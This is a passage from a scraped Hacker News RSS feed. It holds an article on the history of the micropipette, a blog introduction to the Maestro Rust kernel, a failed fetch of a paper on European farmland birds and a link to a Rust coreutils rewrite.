            <p><a href="https://github.com/signup?ref_cta=Sign+up&amp;ref_loc=header+logged+out&amp;ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&amp;source=header-repo&amp;source_repo=anisotropi4%2Fkingfisher" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/anisotropi4/kingfisher/blob/main/station.md&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="c0b5191e8b5b0ebfb05d0272de955d3957f111471c41c33106cd9caae5ec70a6" data-analytics-event="{&quot;category&quot;:&quot;Sign up&quot;,&quot;action&quot;:&quot;click to sign up for account&quot;,&quot;label&quot;:&quot;ref_page:/<user-name>/<repo-name>/blob/show;ref_cta:Sign up;ref_loc:header logged out&quot;}">
              Sign up
            </a>
        </p></div>
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Making the Micropipette (132 pts)]]></title>
            <link>https://press.asimov.com/resources/making-the-micropipette</link>
            <guid>38852534</guid>
            <pubDate>Wed, 03 Jan 2024 10:32:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://press.asimov.com/resources/making-the-micropipette">https://press.asimov.com/resources/making-the-micropipette</a>, See on <a href="https://news.ycombinator.com/item?id=38852534">Hacker News</a></p>
<div id="readability-page-1" class="page"><div fs-toc-offsettop="25px" fs-toc-element="contents"><h2><strong>‚ÄúHazards of Mouth Pipetting‚Äù</strong></h2><p>The micropipette, an instrument favored by researchers around the world to measure and move liquids from one container to another and used for everything from forensic analysis to DNA sequencing, was invented by an obscure, <a target="_blank" href="https://www.chemistryworld.com/opinion/schnitgers-pipette/7789.article">32-year-old German postdoc</a> after a particularly productive two-day tantrum.</p><p><a target="_blank" href="https://en.wikipedia.org/wiki/Heinrich_Schnitger">Heinrich Schnitger</a> was born in Lemgo, Germany in 1925. He fought in the Second World War, but was hospitalized with tuberculosis and removed from active duty as a result. The illness probably saved his life. After the war, Schnitger earned a PhD in medicine and began a research position at the University of Marburg.</p><p>There, Schnitger busied himself with chromatography, a technique to isolate molecules by flowing liquids through columns and then painstakingly sorting the tiny drops that emerged. At the time, these experiments were done entirely with mouth pipettes. Researchers would suck liquids into a glass tube and then transfer the liquid to another container. But mouth pipettes were fragile, inaccurate, and dangerous.</p><figure><p><img src="https://assets-global.website-files.com/6518fc1601bb06d3facf5039/659374040375bb61720ca1ea_38455898272_650f944b91_o.jpg" loading="lazy" alt=""></p><figcaption>Dr. Adah Elizabeth Verder using a mouth pipette, ca. 1938. Credit: <a href="https://www.flickr.com/photos/nihgov/38455898272" target="_blank">National Institutes of Health</a></figcaption></figure><p>A <a target="_blank" href="https://scholar.google.com/scholar_lookup?journal=Med+Klin&amp;title=The+prevention+of+laboratory+infection&amp;author=L+Paneth&amp;volume=11&amp;publication_year=1915&amp;pages=1398-9&amp;">1915 survey</a> of 57 research laboratories found that 40 percent of workplace-related infections were directly linked to mouth pipetting. Decades later, in the 1960s, U.S. Army researchers penned an article entitled, ‚Äú<a target="_blank" href="https://apps.dtic.mil/sti/tr/pdf/AD0640356.pdf">Hazards of Mouth Pipetting</a>.‚Äù Leaving no room for ambiguity, they conclude in all caps: DO NOT MOUTH PIPETTE INFECTIOUS OR TOXIC FLUIDS and USE A PIPETTOR DEVICE FOR PIPETTING.<sup>1</sup></p><p>Schnitger viewed mouth pipettes with ‚Äú<a target="_blank" href="https://doi.org/10.1038%2Fsj.embor.7400520">great contempt</a>.‚Äù In 1957, presumably driven by this pique, he vanished from the laboratory and returned, two days later, ‚Äúwith a self-designed tool to pipette microlitre volumes.‚Äù On May 3rd, Schnitger <a target="_blank" href="https://patents.google.com/patent/DE1090449B/en">filed a patent entitled</a>, ‚ÄúDevice for quick and precise pipetting of small amounts of liquid.‚Äù The patent was granted in 1961, and his design had ‚Äú<a target="_blank" href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC1369176/">all the essential features</a> of the modern pipette,‚Äù according to a close witness of the invention, including a spring-loaded piston, second spring to shoot out residual liquid, and plastic tip.<sup>2</sup></p><p>It is nearly impossible to imagine modern biology without the micropipette, which has enabled scientists to manipulate cells with a much higher degree of precision. It was used in the first experiments with <a target="_blank" href="https://www.pnas.org/doi/epdf/10.1073/pnas.69.10.2904">recombinant DNA</a> and also, as early as 1968, to determine the <a target="_blank" href="https://www.nature.com/articles/218346a0">sex of rabbit embryos</a>, a necessary precursor to the development of <em>in vitro </em>fertilization. But this tool‚Äôs widespread adoption was not inevitable, nor were its features preordained. The micropipette only exists thanks to a long line of scientists and businessmen whose creative iterations, savvy deals, and expensive legal battles shaped the course of modern science.</p><p>Like much technology, the development of the micropipette is a story of adaptive radiation. Inventors living in completely different parts of the world each came up with their own ways to move around small volumes of liquid. Many designs failed, other features caught on, and the winners ‚Äî such as disposable plastic tips and knobs to adjust the micropipette‚Äôs volume ‚Äî were gradually reconfigured into the devices used today.</p><p>Although the modern micropipette begins with Schnitger‚Äôs exasperation, his own story, sadly, ends in 1964, when he went for a swim in a Bavarian mountain lake and drowned. While this was an untimely end for a great innovator, it is oddly fitting that a man best known for creating a device to move around small volumes of liquid died unable to manage large ones.</p><h2><strong>The Modern Micropipette</strong></h2><p>Schnitger‚Äôs first micropipette was made from simple parts. He had taken a small metal syringe, similar to those used in hospitals, and added <a target="_blank" href="https://thebiomedicalscientist.net/science/no-more-sucking-60-years-micropipette">a spring and end stop</a> to it. Schnitger replaced the syringe needle with a plastic tip, which he had crafted from a polyethylene tube, and added a little air pocket to keep liquids from touching the metal pistons and contaminating or corroding the inside of the device.<sup>3</sup> To suck up liquid, Schnitger pressed the plunger to the stop, put the tip into the liquid, and then released the plunger. Pressing the plunger again expelled the liquid.</p><p>Despite its novelty, Schnitger‚Äôs design lacked several features that modern scientists take for granted. The device‚Äôs volume could not be adjusted, and the polyethylene tips were too expensive to be disposable, which made them prone to contamination. A solution to these deficits arrived by way of a broad-faced Finn in 1969.</p><figure><p><img src="https://assets-global.website-files.com/6518fc1601bb06d3facf5039/6593744c96a96e82e2fb7a19_pipette_evolution%20(2).png" loading="lazy" alt=""></p><figcaption>Evolution of the micropipette. (Top) Heinrich Schnitger‚Äôs 1957 design was refined by scientists at Eppendorf, a German laboratory equipment manufacturer. (Middle) An <a target="_blank" href="https://www.reddit.com/media?url=https%3A%2F%2Fi.redd.it%2Fqypp66y3i6w91.jpg">original Gilson micropipette</a>, probably manufactured between 1969 and 1972. (Bottom) A modern Gilson Pipetman.</figcaption></figure><p><a target="_blank" href="https://doi.org/10.1111/j.1540-6520.2011.00488.x">Osmo Suovaniemi</a> grew up in a farming family from Kihni√∂, Finland, a tiny town on a small lake one-and-a-half hours north of Tampere, the nearest mid-sized city. He studied medicine by day and worked in research labs at the University of Helsinki by night. While mouth pipetting one night in the lab, Suovaniemi ‚Äúalmost swallowed a piece of rat‚Äôs brain,‚Äù according to a <a target="_blank" href="https://jyx.jyu.fi/bitstream/handle/123456789/44068/kontinenbiohitdraft.pdf?sequence=1&amp;isAllowed=y">2014 review</a>. After tinkering with syringes, springs, and screws, Suovaniemi assembled a micropipette with a knob on top to adjust the volume inside‚Äîno mouth-suction required.</p><p>Suovaniemi <a target="_blank" href="https://worldwide.espacenet.com/patent/search/family/008507281/publication/FI44070B?q=FI44070">filed a patent application</a> on his adjustable micropipette in 1969, at the age of 26, and founded a company to produce the devices.<sup>4</sup> His work is little-known outside Finland, and the design didn‚Äôt catch on, in part because it lacked a numerical gauge to display volumes, which hampered its precision.<sup>5</sup>&nbsp;</p><p>Shortly after making his adjustable micropipette, Suovaniemi made a second pipette that could move multiple liquids around at once; it was the first multichannel pipette. Interestingly, Suovaniemi didn‚Äôt attribute his inventions to diligence or tireless ambition, but quite the opposite. ‚ÄúI‚Äôm extremely lazy by nature,‚Äù Suovaniemi <a target="_blank" href="https://journals.sagepub.com/doi/10.1111/j.1540-6520.2011.00488.x">once told</a> an interviewer, so ‚ÄúI created a pipette with nine channels.‚Äù His multichannel pipette, with tips arranged in a 3 x 3 grid, was <a target="_blank" href="https://worldwide.espacenet.com/patent/search/family/008507213/publication/FI44069B?q=FI44069C">patented in 1969</a>.&nbsp;</p><p>In 1972, another <a target="_blank" href="https://www.gilson.com/pub/media/docs/GuideToPipettingE.pdf">micropipette breakthrough</a> came from <a target="_blank" href="https://www.gilson.com/default/about/our-history.html">Warren E. Gilson</a>, a bald, ruddy-cheeked medical professor in Wisconsin. With help from his son Robert, and several scientists at the University of Wisconsin, Gilson used a screw mechanism to adjust the travel of the piston, thus changing the volume of liquid. A gauge on the pipette‚Äôs side displayed the position of the screw. The pipette also had a locking ring on top that could be set to keep volumes from shifting by accident.</p><p>Gilson‚Äôs pipette design is still sold by his eponymous company, which is led by a third-generation family member. In 1974, Gilson‚Äôs French collaborator, Eric Marteau D'Autry, <a target="_blank" href="https://patents.google.com/patent/US3991617A">changed the finger hook design and added a tip ejection mechanism</a>. The result was the first recognizably modern micropipette ‚Äî a device made by a French-American duo, based on earlier designs by German and Finnish scientists.</p><p>The D‚ÄôAutry-Gilson micropipettes were sold across Europe, but rights to the United States market were bought by <a target="_blank" href="https://krfoundation.org/about/what-we-do/">Kenneth Rainin</a>, a young California businessman. Rainin was born in Cleveland, Ohio in 1938, <a target="_blank" href="https://www.sfgate.com/bayarea/article/Kenneth-Rainin-entrepreneur-donor-2597182.php">later joined the Army</a>, and got his start selling science equipment in Boston. At the age of 25, Rainin founded the Rainin Instrument Company, which distributed Gilson‚Äôs pipettes and other laboratory supplies.</p><p>Although Rainin became rich selling Gilson‚Äôs pipettes, he also went on to build his own pipette empire that he later sold to the Mettler-Toledo corporation, in 2001, for more than <a target="_blank" href="https://www.sec.gov/Archives/edgar/data/1037646/000103764601500013/tpexhibit.txt">$290 million</a> in cash and stock. Rainin ordered a custom-made, 62-meter-long <a target="_blank" href="https://www.feadship.nl/fleet/rasselas1">motor yacht</a> with English country-home decor and mahogany paneling.</p><p>Rainin had skills outside of business, too. He made many improvements to the micropipette, including the addition of an electronic display to make it easier to see the set volumes, and ‚Äúquick-set‚Äù controls so that scientists didn‚Äôt need to twist the pipette several times to move from a small volume to a large volume. Rainin also modified the Gilson design so that it fit better in the hand, and reduced the strength required to eject the plastic tips.<sup>6</sup> More comfortable micropipettes were a welcome improvement; a <a target="_blank" href="https://doi.org/10.1016/s0003-6870(97)00002-1">1997 study</a> that surveyed 80 scientists who used a pipette for more than one hour per day found that 90 percent of them reported hand or elbow disorders.</p><p>As evidenced by Rainin‚Äôs ergonomic refinements on Gilson‚Äôs base design, micropipette companies operated in relative harmony for several decades. But then, an issue with the Rainin-Gilson contract saw the two companies run headlong into an expensive legal battle, and all equanimity was dashed.</p><p>Rainin was Gilson‚Äôs exclusive distributor in the United States. Under the terms of their distribution contract, Rainin was supposed to promote Gilson‚Äôs products. But after Gilson‚Äôs patent for the adjustable pipette expired in 1991, Rainin saw an opportunity to introduce a competing line of pipettes and market them to American scientists.&nbsp;</p><p>In 2004, Gilson <a target="_blank" href="https://casetext.com/case/rainin-instrument-llc-v-gilson-3#:~:text=The%20court%20then%20granted%20Gilson%27s,and%20sell%20Gilson%27s%20Pipetman%20products.">filed a lawsuit</a> against Rainin, accusing Rainin executives of ‚Äúa campaign to disparage Gilson's Pipetman products and route customers to their own competing product lines.‚Äù A Wisconsin court ‚Äúgranted Gilson's motion for judgment as a matter of law and held that Rainin and Mettler-Toledo breached their obligation to use their best efforts to market and sell Gilson's Pipetman products,‚Äù according to <a target="_blank" href="https://www.nbcnews.com/id/wbna7956647">reporting</a> in <em>NBC News</em>. <a target="_blank" href="https://madison.com/news/local/gilson-wins-contract-dispute-the-middleton-based-company-won-500-000-following-a-jury-decision/article_1a203d0d-9441-56cf-ab85-08c9b4f22f43.html">A jury awarded Gilson $500,000 in damages</a>, far less than the $8 million Gilson had initially sought. But the jury‚Äôs decision wasn‚Äôt the only blow dealt to Rainin: The company also lost their exclusive license to sell Gilson pipettes in the United States, which cost Rainin an estimated $19 million in lost revenue.</p><figure><p><img src="https://assets-global.website-files.com/6518fc1601bb06d3facf5039/659374af6df8ea43c3238c66_pipette_history_inventors%20(1).png" loading="lazy" alt=""></p><figcaption>Micropipette innovators. From top left, moving clockwise: Heinrich Schnitger, Osmo Suovaniemi, Kenneth Rainin and Warren Gilson.</figcaption></figure><p>As Gilson and Rainin competed for large chunks of the micropipette market, other businesses popped up to profit from their disposable tips.</p><p>The first micropipettes used custom-made Teflon tips, which had good chemical resistance and high accuracy, but were too expensive to regularly dispose of. The German company that first licensed Schnitger‚Äôs 1957 invention, Eppendorf, also made the first disposable polypropylene tips. Disposable plastic tips helped scientists avoid some cross-contamination but couldn‚Äôt always be used in sensitive experiments because liquids produce small amounts of aerosols that get sucked into the pipette body and then seep into subsequent samples. In 1986, Eppendorf scientists <a target="_blank" href="https://patents.google.com/patent/US4999164A">added a filter at the top of each pipette tip</a> to block such aerosols.<sup>7</sup></p><p>Rainin‚Äôs company, seeking to boost profits, also launched their own line of narrow-tapered tips that could only be used on Rainin micropipettes. Their logic was akin to those of the <a target="_blank" href="https://en.wikipedia.org/wiki/Razor_and_blades_model">razor blade companies</a>: sell the pipette for a few hundred dollars and tips for $20 per box. Over time, they assumed, the vast majority of profits would come from selling the tips. In the early 2000s, though, a company called USA Scientific found a way to make Rainin-compatible tips without using Rainin‚Äôs patents. Rainin <a target="_blank" href="https://casetext.com/case/usa-scientific-llc-v-rainin-instrument">sued them</a>, albeit unsuccessfully, and USA Scientific still sells Rainin-style tips.</p><p>And that‚Äôs the making of the modern micropipette. For roughly three decades, the invention was iterated upon and refined by German, Finnish, American, and French inventors. Some of these inventors were driven by profit, and others just didn‚Äôt want to aspirate the brains of a rat. Their collective efforts culminated in an indispensable tool for modern biology and medicine.</p><h2><strong>Adaptive Radiation</strong></h2><p>A typical PhD student in the biosciences will use about 200,000 pipette tips over the course of their research.<sup>8</sup> Hospitals and medical labs use even larger quantities of tips for diagnostic tests. This was starkly highlighted in 2020, when demand for COVID testing, coupled with a low supply of polypropylene resin after Texas power outages temporarily closed plastic manufacturing plants, caused the <a target="_blank" href="https://www.statnews.com/2021/04/28/pipette-tips-shortage/">Great Pipette Tip Shortage.</a>&nbsp;</p><p>Pipette tip manufacturers were backordered for months, and sometimes years, as queues for COVID tests, newborn genetic screening, and other diagnostic tests lengthened. A single PCR-based diagnostic test requires about ten pipette tips, and more than a million of these tests were performed every day by October 2020. Scientists bartered with other scientists for tips, tried their luck with sketchy resellers, or gambled with <a target="_blank" href="https://grenovasolutions.com/grenovas-solution-to-covid-19/">washing and reusing tips</a>.</p><p>But as the adage asserts: necessity is the mother of invention. Just as the first microplate, a flat plate with little wells on top to hold liquids, was invented by a Hungarian scientist as a replacement for plastic tubes after an influenza epidemic led to a <a target="_blank" href="https://www.wellplate.com/the-history-of-the-microplate/">manufacturing shortage</a> in Hungary in the early 1950s, the recent pandemic spurred similar innovations in micropipette and tip designs.</p><p>A chemistry lab in Connecticut invented a <a target="_blank" href="https://pubmed.ncbi.nlm.nih.gov/36689276/">COVID-19 diagnostic kit</a> using 3D-printed micropipette tips and a smartphone app. Chemists in Okayama, Japan developed <a target="_blank" href="https://pubmed.ncbi.nlm.nih.gov/37008150/">paper-based analytical devices</a> that don‚Äôt have to be loaded with a micropipette at all. Eppendorf launched a line of pipette tips made from <a target="_blank" href="https://www.eppendorf.com/us-en/lab-academy/lab-solutions/eppendorf-consumables-biobased/">biologically-derived propylene gas</a>, ostensibly to help <a target="_blank" href="https://news-archive.exeter.ac.uk/featurednews/title_488903_en.html">curb plastic waste</a>. While the supply chain corrected itself, ultimately relieving the pipette tip shortage, times of need or specialization are often moments where innovation is especially active.</p><p>The basic micropipette design used in laboratories today has remained largely the same since the mid-1970s, when D‚ÄôAutry and Gilson made their adjustable version. But innovations have continued to the present. In 2018, a bioengineering team in Chicago <a target="_blank" href="https://www.mdpi.com/2072-666X/9/4/191">open-sourced blueprints</a> for a 3D-printed, adjustable micropipette. A <a target="_blank" href="https://doi.org/10.1039/c8lc00505b">highly precise micropipette</a> that dispenses tiny volumes as small as 0.1 microliter, with a variation of just 0.6 percent, was developed the same year. And in 2014, a Japanese team invented a micropipette that can pick up <a target="_blank" href="https://ieeexplore.ieee.org/document/7006139">individual cells</a> through a thin, glass tube.</p><figure><p><img src="https://assets-global.website-files.com/6518fc1601bb06d3facf5039/659374f237f40ba11ac2035e_pipette_history_3D_printed%20(1).png" loading="lazy" alt=""></p><figcaption>Adjustable, accurate micropipettes can now be made at home, with little more than medical syringes and 3D-printed plastic parts. Credit: <a target="_blank" href="https://www.mdpi.com/2072-666X/9/4/191">Brennan M.D. <em>et al.</em></a> ‚ÄúOpen Design 3D-Printable Adjustable Micropipette that Meets the ISO Standard for Accuracy,‚Äù <em>Micromachines </em>(2018).</figcaption></figure><p>Technological progress often proceeds as a linear series of advances: the vacuum tube, then the transistor, then the microchip. But the history of pipettes reveals a subtler story.</p><p>Even before Schnitger made the piston-driven micropipette in 1957, other inventors had proposed unique ways to measure, or move, small volumes of liquid. Some of these ideas worked, but did not catch on. For example, in 1953, two American inventors, James W. Brown and Robert L. Weintraub, <a target="_blank" href="https://image-ppubs.uspto.gov/dirsearch-public/print/downloadPdf/2771217">filed a patent</a> for an adjustable pipette with a removable tip. The device dispensed tiny drops of liquid via the spinning of a wheel on one end, and it could be used with one hand. But Schnitger‚Äôs plunger mechanism ultimately won out.</p><p>Path dependencies also shaped the development of the modern micropipette; one refinement often set the course for subsequent ones. Multichannel pipettes today are designed around the 96-well plate, for example, which was itself copied from the Hungarian 72-well format. If scientists had adopted the 72-well format, multichannel pipettes today might look very different.<sup>9</sup></p><p>Nearly all biological research requires the ability to transfer precise volumes of liquids, which makes it interesting to speculate about what might have happened if the micropipette was invented a few years earlier or later.<sup>10</sup> The scientists who <a target="_blank" href="https://en.wikipedia.org/wiki/Crick,_Brenner_et_al._experiment">deciphered the genetic code</a> and <a target="_blank" href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3104267/">discovered the principles of gene expression</a> in the late 1950s and early 1960s performed their experiments mostly with mouth pipettes. This makes their feats more impressive, but adjustable micropipettes would have greatly accelerated their work. Likewise, the <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC392330/" target="_blank">groundbreaking</a> <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC431765/" target="_blank">experiments</a> on DNA sequencing in the mid-1970s, which kickstarted the field of genomics, would have been difficult to achieve without micropipettes.</p><p>The micropipette‚Äôs history is a reminder that simple tools can have a large impact. Even a task as straightforward as transferring liquid from one tube to another can be accomplished by many different mechanisms, some of which are vastly superior to others. And so it‚Äôs worth considering: What is something you do, day after day, that is arduous or bothersome? Do you have a subtle itch or a pressing need to make it easier?</p><p>If the answer is yes, consider spending a couple of days making improvements to the process, as a frustrated Schnitger did in 1957. Simple solutions to widespread problems can alter the course of scientific history.</p><h6>Footnotes</h6><ol start="1" role="list"><li>Today, researchers have mostly heeded this advice, and only use mouth pipettes in niche cases where they need both hands free.</li><li>Eppendorf, a German medical supply company, purchased an exclusive license. The company made at least two models by 1961; one to pipette 1 microliter volumes (smaller than a grain of salt) and another for 25 microliter volumes.</li><li>This feature was essential; Schnitger‚Äôs first micropipette was used to transfer formic acid, a chemical that reacts with metal to form hydrogen gas.</li><li>Suovaniemi is 80 years old and remains <a target="_blank" href="https://www.bloomberg.com/profile/person/2502477">chairman of the board</a> of his company, <a target="_blank" href="https://www.biohithealthcare.com/fi/etusivu/">Biohit OYJ</a>.</li><li>The <a target="_blank" href="https://www.thermofisher.com/us/en/home/life-science/lab-plasticware-supplies/pipettes-pipette-tips/finnpipette-systems.html">Finnpipette brand</a>, sold by Thermo Fisher, derives from Suovaniemi‚Äôs design. But I‚Äôve never seen one of these pipettes in person, and their market share (at least in America) is a small fraction of other manufacturers.</li><li>Rainin pipettes received the highest overall score in a <a target="_blank" href="https://pubmed.ncbi.nlm.nih.gov/21673445/">2010 study</a> that asked twenty-one scientists to rate the comfort and usability of ten different micropipettes. Scientists collectively rated Rainin pipettes highest for ‚Äúhand and arm comfort,‚Äù as well as its ‚Äúlower tip ejection force, lower blowout force, and pipette balance in the hand.‚Äù</li><li>Eppendorf scientists were inspired by filters designed to <a target="_blank" href="https://patents.google.com/patent/FR2380059A1/en">protect scientists who used mouth pipettes to transfer infectious materials</a>.</li><li>An estimated ten boxes of 96 tips per week, with 50 working weeks per year over a 5-year period, comes out to 240,000 tips. And five years is a generous estimate for completion of a PhD in the biosciences.</li><li>The number 96 has several advantages, including the fact that it has many integer factors, which makes it simple to evenly divide the plate for experiments.</li><li>Polypropylene was not <a target="_blank" href="https://books.google.com/books?id=GjtJfmxvSWgC&amp;pg=PA76#v=onepage">produced at a large scale</a> until the mid-1950s, and so a different (and likely inferior) material would have been required to make the plastic tips.</li></ol><p><em>Metacelsus is a PhD student who researches synthetic biology, stem cells, and reproductive development. He also writes the blog </em><a href="https://denovo.substack.com/" target="_blank"><em>De Novo</em></a><em>.</em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Maestro: A Linux-compatible kernel in Rust (576 pts)]]></title>
            <link>https://blog.lenot.re/a/introduction</link>
            <guid>38852360</guid>
            <pubDate>Wed, 03 Jan 2024 09:59:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.lenot.re/a/introduction">https://blog.lenot.re/a/introduction</a>, See on <a href="https://news.ycombinator.com/item?id=38852360">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
					
					<h6><span id="date-long">2024-01-02T15:00:00+00:00</span></h6>
					<p>
						Maestro is a Unix-like kernel and operating system written from scratch in Rust
					</p>
					<p><img src="https://blog.lenot.re/assets/article/neofetch.png">
				</p></div><div>
					<p>Thanks to the internet, I can learn how most things I am interested in work. However, something stayed a mystery to me for a long time: computers.</p>
<p>Computers are amongst the most complex tools that humanity has ever built. They are a marvel of engineering that we take for granted because we use them in our everyday lives.</p>
<p>I like to dig into complexity, and I like to learn by doing.
On top of that, I spend a lot of time on the computer. Wouldn‚Äôt it be cool if I had a system that I would know from A to Z and that I could customise as much as I wanted to fit my expectations?</p>
<p>This is why I decided to build <a href="https://github.com/llenotre/maestro" target="_blank">Maestro</a>. A Unix-like operating system that is meant to be lightweight and compatible-enough with Linux to be usable in everyday life.</p>
<h2>A bit of history</h2>
<p>The first commit of the kernel dates back to December 22nd, 2018, at 3:18 in the morning (the best time to write code, of course). It started as a school project.</p>
<p>It was originally implemented using the <strong>C language</strong> and continued to be for roughly a year and a half, until the codebase became too hard to keep clean.</p>
<p>At that moment, I decided to switch to <strong>Rust</strong> (my first project in this language), which represented several advantages:</p>
<ul>
<li>Restart the project from the beginning, using lessons learned from previous mistakes</li>
<li>Be a bit more innovative than just writing a Linux-like kernel in C. After all, just use Linux at that point</li>
<li>Use the safety of the Rust language to leverage some difficulty of kernel programming. Using Rust‚Äôs typing system allows to shift some responsibility over memory safety from the programmer to the compiler</li>
</ul>
<p>In kernel development, debugging is very hard for several reasons:</p>
<ul>
<li>Documentation is often hard to find, and BIOS implementations may be flawed (more often than you would think)</li>
<li>On boot, the kernel has full access to the memory and is allowed to write where it should not (its own code, for example)</li>
<li>Troubleshooting memory leaks is not easy. Tools such as <em>valgrind</em> cannot be used</li>
<li><em>gdb</em> can be used with <em>QEMU</em> and <em>VMWare</em>, but the kernel may have a different behaviour when running on a different emulator or virtual machine. Also, those emulators may not support gdb (example <em>VirtualBox</em>)</li>
<li>Some features in the support for gdb in QEMU or VMWare are missing (such as <em>Record and Replay</em>) and gdb might even crash sometimes</li>
</ul>
<p>All those issues are reasons for using a memory-safe language, to avoid them as much as possible.</p>
<p>Overall, the use of Rust in the kernel allowed for the implementation of a lot of safeguards. And I believe that it is, to this day, the best decision I have made for this project.</p>
<h3>Timelapse</h3>
<video controls="" width="100%" loading="lazy">
  <source src="https://blog.lenot.re/assets/article/gource.mp4" type="video/mp4">
</video>
<p>Created using <a href="https://gource.io/" target="_blank">Gource</a>. Music: <em>Many Moons of Saturn, Mike Cole</em></p>
<h2>The current state of the project</h2>
<p>Maestro is a monolithic kernel, supporting only the x86 (in 32 bits) architecture for now.</p>
<p>At the time of writing, <strong>135</strong> out of <strong>437</strong> Linux system calls (roughly 31%) are more or less implemented.
The project has <strong>48 800</strong> lines of code across <strong>615</strong> files (all repositories combined, counted using the <code>cloc</code> command).</p>
<p>The OS currently has the following components, aside from the kernel:</p>
<ul>
<li><a href="https://github.com/llenotre/solfege" target="_blank">Solf√®ge</a>: a boot system and daemon manager (kind of similar to systemd, but lighter)</li>
<li><a href="https://github.com/llenotre/maestro-utils" target="_blank">maestro-utils</a>: system utility commands</li>
<li><a href="https://github.com/llenotre/blimp" target="_blank">blimp</a>: a package manager</li>
<li>And more components that are available on <a href="https://github.com/llenotre" target="_blank">my github</a></li>
</ul>
<p>So far, the following third-party software has been tested and is working on the OS:</p>
<ul>
<li>musl (C standard library)</li>
<li>bash</li>
<li>Some GNU coreutils commands such as <code>ls</code>, <code>cat</code>, <code>mkdir</code>, <code>rm</code>, <code>rmdir</code>, <code>uname</code>, <code>whoami</code>, etc‚Ä¶</li>
<li>neofetch (a patched version, since the original neofetch does not know about my OS)</li>
</ul>
<h2>Test it yourself!</h2>
<blockquote>
<p><strong>Disclaimer</strong>: It is important to note that the OS is still in a very early stage of development and is highly unstable. I discourage trying to install it on a machine with important data on it.</p>
<p>So far, it has been tested mostly on QEMU, VMWare and VirtualBox.</p>
</blockquote>
<p>There are two ways you can install the OS:</p>
<ul>
<li>Use a pre-built (compressed) .iso file that you can download <a href="https://blog.lenot.re/assets/article/maestro.iso.gz">here</a></li>
<li><a href="https://github.com/llenotre/maestro-install/" target="_blank">Build the ISO yourself</a></li>
</ul>
<p>The ISO provides an installer for the OS. You can use it on QEMU, VMWare or VirtualBox for example.</p>
<blockquote>
<p>You should run the ISO with sufficient RAM (<strong>1GB</strong> should be more than enough).</p>
<p>Such an amount of memory is required because packages to be installed are stored in RAM (on the initramsfs) instead of the disk. This is currently the best method since the OS is <em>not yet</em> able to read on a USB stick or CD-ROM by itself, so it relies on the bootloader for this.</p>
</blockquote>
<h2>What this blog is about</h2>
<p>The aim of this blog is <strong>not</strong> to write tutorials about how to create an OS. This is already well covered by other websites/blogs. I recommend in particular:</p>
<ul>
<li><a href="https://wiki.osdev.org/Expanded_Main_Page" target="_blank">osdev.org</a></li>
<li><a href="https://os.phil-opp.com/" target="_blank">Philipp Oppermann‚Äôs blog</a></li>
</ul>
<p>The goal is to explore more advanced subjects (since most people/blogs tend to stop at the basics), to push the subjects as far as I am able to, to write articles about problems I encounter and how I solve them, to discover how computers work underneath, but also operating systems, the internet, and much more‚Ä¶ Plenty of things to talk about!</p>
<h2>What‚Äôs coming next?</h2>
<p>Cleaning of the codebase and performance optimisations are in order. Since the OS started as a school project, I had to cut corners in order to finish it on time. But now is the time to pay back the technical debt I accumulated.</p>
<p>Some memory leaks are also lying around and have to be fixed. Performance optimisations will probably be a subject for blog articles.</p>
<p>The next leap forward will be to have the package manager fully working on the OS. To do so, some features are required:</p>
<ul>
<li>Network support, which is currently under development. And will probably be the subject of numerous articles</li>
<li>Shared library support. This currently does not work because it requires mapping files directly into memory, which is not currently supported by the implementation of the <code>mmap</code> system call on the kernel</li>
</ul>
<p>After that, I will be able to install (without pain) and test programmes such as compilers (gcc/g++, clang, rustc), make, Git, Vim, etc‚Ä¶ And then develop the kernel while using it!</p>
<p>The development of the kernel largely follows a simple procedure:</p>
<ul>
<li><strong>1</strong>: Run a programme on the kernel and see if it works correctly</li>
<li><strong>2</strong>: If it does not work, then:
<ul>
<li><strong>3</strong>: Run the programme while printing system calls and search for the first system call that is causing troubles (not implemented or buggy)</li>
<li><strong>4</strong>: Implement or fix the system call in question</li>
<li><strong>5</strong>: Go to step 1</li>
</ul>
</li>
<li><strong>6</strong>: Else: Yay!</li>
</ul>
<p>The more programmes running correctly on the kernel, the more stable and complete it becomes!</p>
<h2>How <em>you</em> can help</h2>
<p>You can leave a star ‚≠ê on the <a href="https://github.com/llenotre/maestro" target="_blank">Github repository of the kernel</a> ‚ù§Ô∏è</p>
<p>And stay in touch by:</p>
<ul>
<li>Subscribing to the newsletter on the <a href="https://blog.lenot.re/">main page</a></li>
<li>Watching the <a href="https://blog.lenot.re/rss">RSS feed</a></li>
</ul>
<p>Do not hesitate to join Discord! If you have feedback to make, advice to give, or questions to ask, I will be glad to answer!</p>

				</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Farmland practices are driving bird population decline across Europe (2023) (131 pts)]]></title>
            <link>https://doi.org/10.1073/pnas.2216573120</link>
            <guid>38852142</guid>
            <pubDate>Wed, 03 Jan 2024 09:17:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://doi.org/10.1073/pnas.2216573120">https://doi.org/10.1073/pnas.2216573120</a>, See on <a href="https://news.ycombinator.com/item?id=38852142">Hacker News</a></p>
Couldn't get https://doi.org/10.1073/pnas.2216573120: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Cross-platform Rust rewrite of the GNU coreutils (279 pts)]]></title>
            <link>https://github.com/uutils/coreutils</link>
            <guid>38851740</guid>
            <pubDate>Wed, 03 Jan 2024 07:56:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/uutils/coreutils">https://github.com/uutils/coreutils</a>, See on <a href="https://news.ycombinator.com/item?id=38851740">Hacker News</a></p>
